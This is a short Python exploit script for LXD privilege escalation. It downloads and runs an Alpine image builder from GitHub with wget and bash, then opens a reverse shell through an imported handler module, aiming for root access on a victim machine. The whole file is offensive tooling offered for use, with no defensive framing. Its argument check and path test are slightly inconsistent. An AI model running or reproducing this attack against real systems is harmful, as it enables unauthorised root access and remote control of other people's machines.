import os
import sys
import rev_shell_handler
# This Exploit uses a vulnerability in the LXD software in order to spawn a root shell

# The exploit requires action in both the attacking and victim machine


def main():
	if len(sys.argv) != 5:
		exit('Wrong number of arguments, pass ip and port')
	print('''
	##################################################################################
	#										 #
	# 			    LXD PRIVILEGE ESCALATION 				 #		
	#										 #
	##################################################################################
	''')
	print('[*] Getting Alpine Builder')
	if not ( os.path.exists('./build-alpine') ):
		cmd = '''
		wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
		bash build-alpine
		'''
		os.system(cmd)
		if not os.path.exists('/build-alpine'):
			sys.exit('Something went wrong, build-alpine not detected')
	else:
		print('[*] We detected that you already have an build-alpine file')
	
	print('[*] Opening Reverse Shell on: {ip}:{port}'.format(ip=sys.argv[1], port=sys.argv[2]))
	rev_shell_handler.listen_shell(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
	

if __name__ == '__main__':
	main()
